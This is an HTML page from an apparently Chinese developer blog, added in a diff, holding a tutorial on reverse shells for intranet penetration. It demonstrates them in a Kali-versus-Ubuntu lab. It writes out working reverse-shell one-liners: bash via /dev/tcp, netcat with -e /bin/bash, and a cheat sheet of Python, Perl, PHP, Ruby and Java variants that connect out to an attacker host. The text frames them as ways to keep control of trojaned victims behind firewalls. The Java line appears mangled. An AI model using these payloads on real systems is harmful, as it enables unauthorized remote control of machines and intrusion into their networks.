@@ -1,0 +1,457 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>内网渗透反弹Shell | 开发者问答集锦</title>
+    <meta property="og:title" content="内网渗透反弹Shell - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="内网渗透反弹Shell">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%8F%8D%E5%BC%B9shell/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">内网渗透反弹Shell</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<h1 id="反弹shell">反弹Shell</h1>
+
+<p><strong>反弹shell（reverse shell）</strong>
+，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse
+shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+
+<p><strong>为什么要反弹shell？</strong></p>
+
+<p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>
+
+<p>比如以下的情况：</p>
+
+<ol>
+<li>某客户机中了你的网马，但是它在局域网内，你直接连接不了；</li>
+<li>目标机器的ip动态改变，你不能持续控制；</li>
+<li>由于防火墙等限制，对方机器只能发送请求，不能接收请求；</li>
+<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</li>
+</ol>
+
+<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+
+<h1 id="bash反弹">Bash反弹</h1>
+
+<h2 id="攻击过程">攻击过程</h2>
+
+<p>Linux中一般默认的 Shell 是 bash，它功能几乎可以涵盖 Shell 所具有的功能，所以一般的 Shell 脚本都会指定它为执行路径。常用的
+Shell有 <strong>ash、bash、dash、ksh、csh、zsh</strong> 等，不同的 Shell 都有自己的特点以及用途。Bash 反弹 Shell
+是最简单、也是最常见的一种反弹 Shell 方式。</p>
+
+<table>
+<thead>
+<tr>
+<th>主机</th>
+<th>IP地址</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Ubuntu 虚拟机</td>
+<td>192.168.43.221</td>
+</tr>
+
+<tr>
+<td>Kali Linux 攻击机</td>
+<td>192.168.43.133</td>
+</tr>
+</tbody>
+</table>
+
+<p>1、首先在 Kali 攻击机使用 Netcat 监听本地 8081 端口：<br />
+<a href="https://img.it610.com/image/info8/c04e5d8558794ef88175c50d73cdab57.jpg"><img src="https://img.it610.com/image/info8/c04e5d8558794ef88175c50d73cdab57.jpg" alt="内网渗透-
+反弹Shell_第1张图片" /></a><br />
+2、在 Ubuntu 靶机中写入 反弹 shell 的命令：<code>bash -i &gt;&amp; /dev/tcp/192.168.43.133/8081
+0&gt;&amp;1</code>，如图所示：<br />
+<a href="https://img.it610.com/image/info8/14d7c212e476446fa9710b771832df21.jpg"><img src="https://img.it610.com/image/info8/14d7c212e476446fa9710b771832df21.jpg" alt="内网渗透-
+反弹Shell_第2张图片" /></a><br />
+3、此时 Kali 攻击机即可成功反弹 shell：<br />
+<a href="https://img.it610.com/image/info8/e63d9e503dba4a6fbd485acff5d77971.jpg"><img src="https://img.it610.com/image/info8/e63d9e503dba4a6fbd485acff5d77971.jpg" alt="内网渗透-
+反弹Shell_第3张图片" /></a><br />
+4、关闭 Ubuntu 的命令终端窗口，以上会话自动断开连接：<br />
+<a href="https://img.it610.com/image/info8/d403e3e61ae74e18a48426e45581f141.jpg"><img src="https://img.it610.com/image/info8/d403e3e61ae74e18a48426e45581f141.jpg" alt="内网渗透-
+反弹Shell_第4张图片" /></a></p>
+
+<h2 id="原理简析">原理简析</h2>
+
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解析</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>nc -lvp 8081</td>
+<td>nc 是 <strong>netcat</strong> 的简写，可实现任意TCP/UDP端口的侦听；-l 监听，-v 输出交互或出错信息，-p 端口</td>
+</tr>
+
+<tr>
+<td>bash -i</td>
+<td>-i interactive，即产生一个交互式的shell（bash）。</td>
+</tr>
+
+<tr>
+<td>/dev/tcp/IP/PORT</td>
+<td>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash</td>
+</tr>
+</tbody>
+</table>
+
+<p>实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
+
+<p>其实以上bash反弹一句完整的解读过程就是：</p>
+
+<p>Bash 产生了一个交互环境与本地主机主动发起与目标主机 8081 端口建立的连接（即TCP 8081 会话连接）相结合，然后在重定向个 TCP
+8081会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 bash 反弹环境。</p>
+
+<p>Bash反弹Shell的深层原理分析可参考以下博文：</p>
+
+<p>1、Linux之bash反弹shell原理浅析；<br />
+2、Linux反弹shell（一）文件描述符与重定向。</p>
+
+<h1 id="netcat反弹">Netcat反弹</h1>
+
+<p>在网络工具中有 “瑞士军刀” 美誉的 NetCat， 在我们用了N年了至今仍是爱不释手，不管是渗透还是取证，100KB的小身板却蕴含着巨大的能量。
+今天我们来简单研究下如何使用 nc 反弹shell。</p>
+
+<h2 id="正向反弹">正向反弹</h2>
+
+<p>Netcat 正向反弹shell是在靶机上监听端口，然后攻击者连接；反向反弹shell 是在攻击者主机上监听端口，然后靶机连接。先来看看正向反弹：</p>
+
+<p>1、在 Ubuntu 靶机上执行命令开启端口监听：<br />
+<a href="https://img.it610.com/image/info8/973271c0ddcf4b9e990fe3cc05833c55.jpg"><img src="https://img.it610.com/image/info8/973271c0ddcf4b9e990fe3cc05833c55.jpg" alt="内网渗透-
+反弹Shell_第5张图片" /></a></p>
+
+<p>2、在 Kali 攻击机上连接靶机的端口：<code>nc 192.168.43.221 7777</code><br />
+<a href="https://img.it610.com/image/info8/d888e6df3cfc4cc9b45800307d477f53.jpg"><img src="https://img.it610.com/image/info8/d888e6df3cfc4cc9b45800307d477f53.jpg" alt="内网渗透-
+反弹Shell_第6张图片" /></a><br />
+3、此时 Ubuntu 靶机上显示连接成功：<br />
+<a href="https://img.it610.com/image/info8/ca27c2e534f94230ab27c5b0b18af5a4.jpg"><img src="https://img.it610.com/image/info8/ca27c2e534f94230ab27c5b0b18af5a4.jpg" alt="内网渗透-
+反弹Shell_第7张图片" /></a></p>
+
+<p>4、此时 Kali 攻击机已反弹获得 Ubuntu 靶机的 Shell，可执行测试命令如下：<br />
+<a href="https://img.it610.com/image/info8/0078305474e8447bbc6d56cb5c69107d.jpg"><img src="https://img.it610.com/image/info8/0078305474e8447bbc6d56cb5c69107d.jpg" alt="内网渗透-
+反弹Shell_第8张图片" /></a></p>
+
+<h2 id="反向反弹">反向反弹</h2>
+
+<p>上面已经说了，nc 反向反弹shell 是在攻击者主机上监听端口，然后靶机连接。下面进行实例演示：</p>
+
+<p>1、在 Kali 攻击机监听本地 6666 端口：<br />
+<a href="https://img.it610.com/image/info8/b0da994c46b54749ac98263e3a4b74ce.jpg"><img src="https://img.it610.com/image/info8/b0da994c46b54749ac98263e3a4b74ce.jpg" alt="内网渗透-
+反弹Shell_第9张图片" /></a></p>
+
+<p>2、在 Ubuntu 靶机上执行命令连接 Kali 攻击机：<code>nc -e /bin/bash 192.168.43.133 6666</code><br />
+<a href="https://img.it610.com/image/info8/645d963bb1c54ba3a1a01068c560b939.jpg"><img src="https://img.it610.com/image/info8/645d963bb1c54ba3a1a01068c560b939.jpg" alt="在这里插入图片描述" /></a></p>
+
+<p>3、此时 Kali 攻击机即可获得反弹 Shell，执行测试命令如下：<br />
+<a href="https://img.it610.com/image/info8/800447292dba4dbca17d6b735d179be4.jpg"><img src="https://img.it610.com/image/info8/800447292dba4dbca17d6b735d179be4.jpg" alt="内网渗透-
+反弹Shell_第10张图片" /></a></p>
+
+<blockquote>
+<p>【 <strong>进阶</strong> 】 以上是针对 Linux 操作系统的反弹 Shell
+的方式，如果目标是windows系统，只需要把<code>/bin/bash</code>换成<code>cmd.exe</code>绝对路径即可，当然这个<code>cmd.exe</code>可以是<code>C:\Windows\System32\cmd.exe</code>，亦可以是通过webshell上传的cmd.exe，实战的话后者更多一点。</p>
+</blockquote>
+
+<p>Netcat 被用作网络的测试工具或黑客工具，使用它你可以轻易的建立任何连接，同时它还内建有很多实用的工具。 nc 除了以上创建反弹 Shell
+（或者说是创建后门）的功能外，还可以进行文件传输、加密流量等。Netcat 的更多使用方法可以参考其他博文：</p>
+
+<p>（1） NetCat使用指南；<br />
+（2）10 个例子教你学会 ncat (nc) 命令 。</p>
+
+<p>同时也可以使用 <code>-h</code> 实时查看参数使用方法：<br />
+<a href="https://img.it610.com/image/info8/fc89c53470a244c59db75758145122a2.jpg"><img src="https://img.it610.com/image/info8/fc89c53470a244c59db75758145122a2.jpg" alt="内网渗透-
+反弹Shell_第11张图片" /></a></p>
+
+<h1 id="python反弹">Python反弹</h1>
+
+<p>有一种现实的情况是，现实的受害主机可能不会给你提供 netcat 的环境，你也不会那么轻易成功将 nc
+上传至靶机，所以更多的情况需要你就地取材，网上有大佬整理了各种版本的反弹 shell 的脚本语言写法，在此借鉴：</p>
+
+<pre><code>1、Python版本：
+python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;
+
+2、Perl版本：
+perl -e 'use Socket;$i=&quot;192.168.10.13&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+
+3、PHP版本：
+php -r '$sock=fsockopen(&quot;192.168.10.13&quot;,8888);exec(&quot;/bin/sh -i &amp;3 2&gt;&amp;3&quot;);'
+
+4、Ruby版本：
+ruby -rsocket -e'f=TCPSocket.open(&quot;192.168.10.13&quot;,8888).to_i;exec sprintf(&quot;/bin/sh -i &amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
+
+5、Java版本：
+r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.10.13/8888;cat &quot; |=&quot;&quot; while=&quot;&quot; read=&quot;&quot; line;=&quot;&quot; do=&quot;&quot; \$line=&quot;&quot;&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()
+</code></pre>
+
+<p>下面演示一下 Python 脚本语言反弹 Shell 的方法：</p>
+
+<p>1、首先使用 nc 在 Kali 上监听端口：<br />
+<a href="https://img.it610.com/image/info8/f60082ea035d4835bb3b21c28469ed59.jpg"><img src="https://img.it610.com/image/info8/f60082ea035d4835bb3b21c28469ed59.jpg" alt="内网渗透-
+反弹Shell_第12张图片" /></a><br />
+2、在 Ubuntu 虚拟机下使用 Python 脚本去反向连接，如下：<br />
+<a href="https://img.it610.com/image/info8/8222cc5cdf0140e0ae841cc9dbe7509a.jpg"><img src="https://img.it610.com/image/info8/8222cc5cdf0140e0ae841cc9dbe7509a.jpg" alt="在这里插入图片描述" /></a>3、此时
+Kali 终端即可获得 Shell：<br />
+<a href="https://img.it610.com/image/info8/771d11006ba1484ca585f83d921a159e.jpg"><img src="https://img.it610.com/image/info8/771d11006ba1484ca585f83d921a159e.jpg" alt="内网渗透-
+反弹Shell_第13张图片" /></a><br />
+最后说一下，我们也可以使用 Kali 的 MSF 框架生成的木马来反弹 Shell，可参考我的另一篇博文：渗透测试-Kali入侵Win7主机。<br />
+<a href="https://img.it610.com/image/info8/501954dda96e415399d6d74bd1e5a974.jpg"><img src="https://img.it610.com/image/info8/501954dda96e415399d6d74bd1e5a974.jpg" alt="内网渗透-
+反弹Shell_第14张图片" /></a><br />
+另外关于内网渗透，除了 <strong>反弹 Shell</strong> 还经常涉及 <strong>端口转发</strong> 和 <strong>正向代理</strong> 的概念，读者可参见另一篇博文：内网渗透-正向代理。</p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
